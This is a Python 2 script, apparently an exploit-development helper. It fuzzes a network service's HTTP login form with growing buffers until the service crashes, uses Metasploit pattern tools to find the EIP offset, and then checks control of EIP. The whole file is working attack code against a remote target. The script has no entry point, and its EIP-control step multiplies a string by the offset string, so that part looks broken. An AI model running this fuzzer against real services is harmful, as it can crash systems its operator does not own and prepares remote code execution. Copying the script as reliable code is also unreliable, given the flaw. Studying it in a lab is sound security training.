#!/usr/bin/python
import socket
import time
import sys
import os
import csv

CEND      = '\33[0m'
CBOLD     = '\33[1m'
CITALIC   = '\33[3m'
CURL      = '\33[4m'
CBLINK    = '\33[5m'
CBLINK2   = '\33[6m'
CSELECTED = '\33[7m'

CBLACK  = '\33[30m'
CRED    = '\33[31m'
CGREEN  = '\33[32m'
CYELLOW = '\33[33m'
CBLUE   = '\33[34m'
CVIOLET = '\33[35m'
CBEIGE  = '\33[36m'
CWHITE  = '\33[37m'

CBLACKBG  = '\33[40m'
CREDBG    = '\33[41m'
CGREENBG  = '\33[42m'
CYELLOWBG = '\33[43m'
CBLUEBG   = '\33[44m'
CVIOLETBG = '\33[45m'
CBEIGEBG  = '\33[46m'
CWHITEBG  = '\33[47m'

CGREY    = '\33[90m'
CRED2    = '\33[91m'
CGREEN2  = '\33[92m'
CYELLOW2 = '\33[93m'
CBLUE2   = '\33[94m'
CVIOLET2 = '\33[95m'
CBEIGE2  = '\33[96m'
CWHITE2  = '\33[97m'

CGREYBG    = '\33[100m'
CREDBG2    = '\33[101m'
CGREENBG2  = '\33[102m'
CYELLOWBG2 = '\33[103m'
CBLUEBG2   = '\33[104m'
CVIOLETBG2 = '\33[105m'
CBEIGEBG2  = '\33[106m'
CWHITEBG2  = '\33[107m'

def fuzzing(bufferloc, sizeFuzzing, host, port):
    if query_yes_no("Do you want start Fuzzing?"):
        print(CGREEN +"[+] Start Fuzzing..."+ CEND)
    while (sizeFuzzing < 2000):
        inputBuffer = "A" * sizeFuzzing

        content = "username=" + inputBuffer + "&password=A"
        buffer = bufferloc + "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        buffer += content

        try:
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(6)
            s.connect((host, port))
        except:
            print(CRED + "\n[!] Could not connect!" + CEND)
            sys.exit()
        try:
            s.send(buffer)
            print(CGREEN2 + '[+] Sending buffer with the pattern.' + CEND)
            s.recv(1024)
            s.close()
            print(CGREEN2 + "Fuzzing with {} bytes.".format(len(inputBuffer)) + CEND)
        except:
            print(CGREEN + "\nFuzzing crashed at {} bytes".format(len(inputBuffer)) + CEND)
            return len(inputBuffer)
        sizeFuzzing += 100
        time.sleep(5)

def findEIP(bufferloc, lenCrash, host, port):
    print("[+] Creating pattern...")
    stream = os.popen("msf-pattern_create -l {}".format(lenCrash))
    pattern = stream.read().strip()
    inputBuffer = pattern
    stream.close()
    content = "username=" + inputBuffer + "&password=A"
    buffer = bufferloc + "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content

    try:
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((host, port))
        print(CGREEN2 +"[+] Sending buffer with a pattern of {} bytes".format(len(inputBuffer)) + CEND)
        s.send(buffer)
        s.close()
    except:
        print(CRED + "\n[!] Could not connect!" + CEND)
        sys.exit()
    eip = raw_input("What is the value of EIP : ") 
    
    while len(eip) != 8:
        eip = raw_input(CRED + "[!] Error EIP is not valid ! Enter its value : " + CEND)
        
    stream = os.popen("msf-pattern_offset -q {} -l {}".format(eip, lenCrash))
    msgOffset = stream.read().strip()
    stream.close()
    print(CGREEN2 + msgOffset + CEND)
    offset = msgOffset.split()[-1]
    return offset

def controlEIP(bufferloc, offset, lenCrash, host, port):
    filler = "A" * offset
    eip = "B" * 4
    overflow = "C" * (lenCrash - offset - 4)
    inputBuffer = filler + eip + overflow
    content = "username=" + inputBuffer + "&password=A"
    buffer = bufferloc + "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content

    try:
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((host, port))
        s.recv(1024)
        print("[+] Sending buffer with a pattern of {} bytes".format(len(inputBuffer)))
        s.send(buffer)
        s.close()
    except:
        print(CRED + "\n[!] Could not connect!" + CEND)
        sys.exit()
    eipGood = query_yes_no("Normally EIP should have this value: 41414141, it is correct?")
    return eipGood

def query_yes_no(question, default="yes"):
    """Ask a yes/no question via raw_input() and return their answer.

    "question" is a string that is presented to the user.
    "default" is the presumed answer if the user just hits <Enter>.
            It must be "yes" (the default), "no" or None (meaning
            an answer is required of the user).

    The "answer" return value is True for "yes" or False for "no".
    """
    valid = {"yes": True, "y": True, "ye": True, "no": False, "n": False}
    if default is None:
        prompt = " [y/n] "
    elif default == "yes":
        prompt = " [Y/n] "
    elif default == "no":
        prompt = " [y/N] "
    else:
        raise ValueError("invalid default answer: '%s'" % default)

    while True:
        sys.stdout.write(question + prompt)
        choice = raw_input().lower()
        if default is not None and choice == "":
            return valid[default]
        elif choice in valid:
            return valid[choice]
        else:
            sys.stdout.write("Please respond with 'yes' or 'no' " "(or 'y' or 'n').\n")